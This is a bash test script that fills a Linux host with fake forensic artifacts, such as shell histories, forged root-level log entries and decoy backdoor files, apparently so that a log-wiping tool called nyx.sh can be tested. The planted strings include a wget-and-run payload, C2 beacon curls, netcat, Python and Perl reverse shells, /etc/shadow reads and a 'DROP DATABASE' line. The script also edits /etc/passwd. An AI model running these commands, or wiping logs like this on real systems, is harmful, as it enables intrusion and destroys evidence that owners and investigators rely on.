#!/bin/bash
# Script to create various forensic artifacts for testing

set -e

echo "================================"
echo "Creating Forensic Artifacts"
echo "================================"
echo ""

# Function to create artifacts
create_artifacts() {
    echo "[*] Creating shell history artifacts..."
    
    # Bash history
    echo "ls -la /etc/passwd" >> ~/.bash_history
    echo "sudo cat /etc/shadow" >> ~/.bash_history
    echo "wget http://malicious.com/payload.sh" >> ~/.bash_history
    echo "chmod +x payload.sh" >> ~/.bash_history
    echo "./payload.sh" >> ~/.bash_history
    printf "whoami\npwd\necho injected\n" >> ~/.bash_history
    
    # Zsh history
    echo ": 1234567890:0;ls -la /etc/passwd" >> ~/.zsh_history
    echo ": 1234567891:0;sudo cat /etc/shadow" >> ~/.zsh_history
    echo ": 1234567892:0;nc -lvp 4444" >> ~/.zsh_history
    HISTFILE=~/.zsh_history; printf ": 0:0;id\n" >> "$HISTFILE"
    
    # Python history
    echo "import os" >> ~/.python_history
    echo "os.system('whoami')" >> ~/.python_history
    echo "exec(open('/etc/passwd').read())" >> ~/.python_history
    
    # MySQL history
    echo "SELECT * FROM users WHERE password IS NOT NULL;" >> ~/.mysql_history
    echo "DROP DATABASE production;" >> ~/.mysql_history
    
    # SQLite history
    echo ".tables" >> ~/.sqlite_history
    echo "SELECT * FROM sensitive_data;" >> ~/.sqlite_history
    
    # R history
    echo "system('cat /etc/passwd')" >> ~/.Rhistory
    echo "data <- read.csv('/sensitive/data.csv')" >> ~/.Rhistory
    
    # GDB history
    echo "break main" >> ~/.gdb_history
    echo "run < /etc/passwd" >> ~/.gdb_history
    
    # MongoDB history
    echo "db.users.find({password: {$exists: true}})" >> ~/.mongo_history
    echo "db.dropDatabase()" >> ~/.mongo_history
    
    # Docker history
    echo "docker run -v /:/host alpine cat /host/etc/shadow" >> ~/.docker_history
    echo "docker exec -it container /bin/bash" >> ~/.docker_history
    
    # Vim info
    echo "# Recent files:" >> ~/.viminfo
    echo "'0  1  0  /etc/passwd" >> ~/.viminfo
    echo "'1  1  0  /etc/shadow" >> ~/.viminfo
    echo "'2  1  0  /home/testuser/secret.txt" >> ~/.viminfo
    
    # Less history
    echo "/etc/passwd" >> ~/.lesshst
    echo "/var/log/auth.log" >> ~/.lesshst
    
    # Wget history
    echo "http://malicious.com/payload.sh 1234567890" >> ~/.wget-hsts
    
    # Create .local/share histories
    mkdir -p ~/.local/share/mc ~/.local/share/nano
    echo "cd /etc" >> ~/.local/share/mc/history
    echo "view passwd" >> ~/.local/share/mc/history
    echo "password123" >> ~/.local/share/nano/search_history
    echo "secret_key" >> ~/.local/share/nano/search_history
    
    echo "[✓] Shell histories created"
    
    # Create some actual commands in current session
    history -s "sudo nmap -sS 192.168.1.0/24"
    history -s "curl http://c2server.com/beacon"
    
    # System logs (as root)
    echo "[*] Creating system log artifacts..."
    sudo bash -c '
        # Auth logs
        echo "Jan 1 12:00:00 testhost sshd[1234]: Failed password for root from 10.0.0.1 port 22 ssh2" >> /var/log/auth.log
        echo "Jan 1 12:00:01 testhost sshd[1234]: Accepted password for testuser from 10.0.0.1 port 22 ssh2" >> /var/log/auth.log
        echo "Jan 1 12:00:02 testhost sudo: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/bash" >> /var/log/auth.log
        
        # Syslog
        echo "Jan 1 12:00:00 testhost kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC=10.0.0.1 DST=10.0.0.2 LEN=52" >> /var/log/syslog
        echo "Jan 1 12:00:01 testhost systemd[1]: Started Reverse Shell Service" >> /var/log/syslog
        
        # Kernel logs
        echo "Jan 1 12:00:00 testhost kernel: Process hiding module loaded" >> /var/log/kern.log
        
        # Apache logs
        mkdir -p /var/log/apache2
        echo "10.0.0.1 - - [01/Jan/2024:12:00:00 +0000] \"GET /admin/config.php HTTP/1.1\" 200 1234" >> /var/log/apache2/access.log
        echo "[Mon Jan 01 12:00:00.123456 2024] [core:error] [pid 1234] [client 10.0.0.1:12345] File does not exist: /var/www/html/shell.php" >> /var/log/apache2/error.log
        
        # Nginx logs
        mkdir -p /var/log/nginx
        echo "10.0.0.1 - - [01/Jan/2024:12:00:00 +0000] \"POST /upload.php HTTP/1.1\" 200 1234 \"-\" \"curl/7.68.0\"" >> /var/log/nginx/access.log
        
        # Audit logs
        if [ -d "/var/log/audit" ]; then
            echo "type=EXECVE msg=audit(1234567890.123:456): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"nc -e /bin/bash 10.0.0.1 4444\"" >> /var/log/audit/audit.log
            echo "type=USER_LOGIN msg=audit(1234567890.123:457): pid=1234 uid=0 auid=1000 ses=1 msg=\"op=login id=1000 exe=\"/usr/sbin/sshd\" hostname=10.0.0.1 addr=10.0.0.1 terminal=/dev/pts/0 res=success\"" >> /var/log/audit/audit.log
        fi
        
        # Login records
        echo "testuser pts/0 10.0.0.1 $(date)" >> /var/log/wtmp
        echo "root pts/1 10.0.0.1 $(date)" >> /var/log/wtmp
        echo "testuser pts/0 10.0.0.1 $(date)" >> /var/log/lastlog
        
        # Failed login attempts
        echo "root ssh:notty 10.0.0.1 $(date)" >> /var/log/btmp
        echo "admin ssh:notty 10.0.0.1 $(date)" >> /var/log/btmp
        
        # Package manager logs
        echo "$(date) install malicious-package:amd64 <none> 1.0-1" >> /var/log/dpkg.log
        echo "$(date) install evilpkg" >> /var/log/dpkg.log
        echo "Commandline: apt-get install netcat" >> /var/log/apt/history.log
        echo "$(date) Installed: evilpkg" >> /var/log/apt/history.log
        echo "Install: netcat:amd64 (1.10-41)" >> /var/log/apt/term.log
        
        # Cron logs
        echo "$(date) (root) CMD (/tmp/backdoor.sh)" >> /var/log/cron
        echo "$(date) (testuser) CMD (curl http://c2server.com/beacon)" >> /var/log/cron.log
        
        # Mail logs
        echo "$(date) testhost postfix: to=<admin@target.com>, relay=evil.com" >> /var/log/mail.log
        echo "$(date) testhost sendmail: from=attacker@evil.com" >> /var/log/maillog
        
        # Firewall logs
        echo "$(date) [UFW BLOCK] SRC=10.0.0.1 DST=10.0.0.2 PROTO=TCP DPT=4444" >> /var/log/ufw.log
        
        # X11 logs
        echo "(EE) Failed to load module \"rootkit\" (module does not exist, 0)" >> /var/log/Xorg.0.log
        
        # CUPS logs
        mkdir -p /var/log/cups
        echo "E [$(date)] Suspicious print job from 10.0.0.1" >> /var/log/cups/error_log
        
        # Network daemon logs  
        echo "$(date) NetworkManager: <info> connection activated" >> /var/log/daemon.log
        
        # NetworkManager connections
        mkdir -p /etc/NetworkManager/system-connections
        echo "[connection]" >> /etc/NetworkManager/system-connections/EvilAP
        echo "id=EvilAP" >> /etc/NetworkManager/system-connections/EvilAP
        
        # Additional audit logs
        echo "type=SYSCALL msg=audit($(date +%s).123:999): syscall=59 exe=\"/bin/nc\"" >> /var/log/audit/ausearch.log
        
        # Current logins (utmp)
        echo "testuser pts/1 10.0.0.1 $(date)" >> /var/log/utmp
    '
    
    # Add journald entries (if systemd is available)
    logger "NYX-TEST: syslog marker" 2>/dev/null || echo "NYX-TEST: syslog marker" | sudo tee -a /var/log/syslog >/dev/null
    if command -v systemd-cat >/dev/null 2>&1; then
        sudo bash -c 'printf "NYX-TEST journald\n" | systemd-cat -t NYX-TEST' 2>/dev/null || true
    fi
    
    echo "[✓] System logs created"
    
    # Create some running processes that would show in logs
    echo "[*] Creating process artifacts..."
    # Start a background process that would appear suspicious
    (sleep 3600 &) 2>/dev/null
    
    # Create temporary files that might be logged
    touch /tmp/suspicious_script.sh
    touch /tmp/.hidden_file
    
    # Create Python/Perl scripts in temp
    echo "#!/usr/bin/python" > /tmp/backdoor.py
    echo "import socket; s=socket.socket(); s.connect(('10.0.0.1',4444))" >> /tmp/backdoor.py
    echo "#!/usr/bin/perl" > /tmp/exploit.pl
    echo "system('nc -e /bin/sh 10.0.0.1 4444');" >> /tmp/exploit.pl
    
    # Create thumbnail caches
    mkdir -p ~/.cache/thumbnails/normal ~/.thumbnails/normal
    touch ~/.cache/thumbnails/normal/suspicious_image.png
    touch ~/.thumbnails/normal/sensitive_doc.pdf.png
    
    # Create core dump
    echo "Core dump from suspicious process" > /tmp/core.12345
    
    echo "[✓] Process artifacts created"
    
    echo "[*] Creating Linux-specific artifacts..."
    
    # Create Trash
    mkdir -p ~/.local/share/Trash/files ~/.local/share/Trash/info
    echo "Deleted sensitive file" > ~/.local/share/Trash/files/sensitive.txt
    echo "[Trash Info]
Path=/home/testuser/sensitive.txt
DeletionDate=$(date +%Y-%m-%dT%H:%M:%S)" > ~/.local/share/Trash/info/sensitive.txt.trashinfo
    
    # Create GNOME Tracker databases
    mkdir -p ~/.cache/tracker3/files ~/.local/state/tracker
    echo "File access logs" > ~/.cache/tracker3/files/meta.db
    echo "Tracker state" > ~/.local/state/tracker/ontologies.db
    
    # Create Zeitgeist logs
    mkdir -p ~/.local/share/zeitgeist
    echo "Activity log database" > ~/.local/share/zeitgeist/activity.sqlite
    
    echo "[✓] Linux-specific artifacts created"
    
    echo "[*] Creating advanced Linux artifacts..."
    
    # GNOME Tracker + thumbnail cache
    mkdir -p ~/Pictures ~/Documents
    # Create a simple image using imagemagick if available
    if command -v convert >/dev/null 2>&1; then
        convert -size 64x64 xc:red ~/Pictures/red.png
        # Try to index with tracker if available
        if command -v tracker3 >/dev/null 2>&1; then
            tracker3 index ~/Pictures/red.png 2>/dev/null || true
        fi
    else
        # Fallback: create a simple file
        echo "test image" > ~/Pictures/red.png
    fi
    
    # Simulate opening file to generate thumbnail
    if command -v xdg-open >/dev/null 2>&1; then
        xdg-open ~/Pictures/red.png >/dev/null 2>&1 &
        sleep 2
        pkill xdg-open 2>/dev/null || true
    fi
    
    # Zeitgeist (older Ubuntu)
    if command -v zeitgeist-daemon >/dev/null 2>&1; then
        zeitgeist-daemon >/dev/null 2>&1 &
        touch ~/Documents/secret.txt
        xdg-open ~/Documents/secret.txt >/dev/null 2>&1 &
        sleep 2
        pkill xdg-open 2>/dev/null || true
    fi
    
    # Audit log entries (simulate if auditd not running)
    if command -v auditctl >/dev/null 2>&1 && sudo auditctl -l >/dev/null 2>&1; then
        sudo auditctl -w /etc/passwd -p wa -k NYXTEST 2>/dev/null || true
        sudo bash -c 'echo "# dummy change for NYXTEST" >> /etc/passwd'
        sleep 1
        sudo auditctl -D 2>/dev/null || true  # Remove rule but keep event
    else
        # Simulate audit log entry
        sudo bash -c 'echo "type=SYSCALL msg=audit($(date +%s).123:999): syscall=59 exe=\"/bin/nc\" key=\"NYXTEST\"" >> /var/log/audit/audit.log'
    fi
    
    # NetworkManager connection artifact
    if command -v nmcli >/dev/null 2>&1; then
        sudo nmcli c add type ethernet ifname nyx-test con-name NYX-TEST \
            ipv4.method disabled ipv6.method ignore 2>/dev/null || true
    fi
    
    echo "[✓] Advanced Linux artifacts created"
}

# Count artifacts before creation
count_artifacts() {
    local count=0
    
    # Count history files with content
    for file in ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history ~/.sqlite_history ~/.viminfo ~/.lesshst ~/.wget-hsts; do
        if [ -s "$file" ]; then
            count=$((count + 1))
        fi
    done
    
    # Count system logs with content (need sudo)
    sudo bash -c '
        for log in /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/apache2/access.log /var/log/apache2/error.log /var/log/nginx/access.log /var/log/audit/audit.log /var/log/wtmp /var/log/btmp /var/log/lastlog; do
            if [ -s "$log" ] 2>/dev/null; then
                count=$((count + 1))
            fi
        done
        echo $count
    ' | read sys_count 2>/dev/null || sys_count=0
    
    count=$((count + sys_count))
    echo $count
}

# Main execution
echo "[*] Initial artifact count: $(count_artifacts)"
echo ""

create_artifacts

echo ""
echo "[*] Final artifact count: $(count_artifacts)"
echo ""
echo "================================"
echo "Artifact Creation Complete!"
echo "================================"
echo ""
echo "Artifacts created in:"
echo "  - Shell histories: ~/.bash_history, ~/.zsh_history, etc."
echo "  - System logs: /var/log/auth.log, /var/log/syslog, etc."
echo "  - Audit logs: /var/log/audit/audit.log"
echo "  - Web server logs: /var/log/apache2/*, /var/log/nginx/*"
echo ""
echo "Run 'nyx.sh' to clean these artifacts"
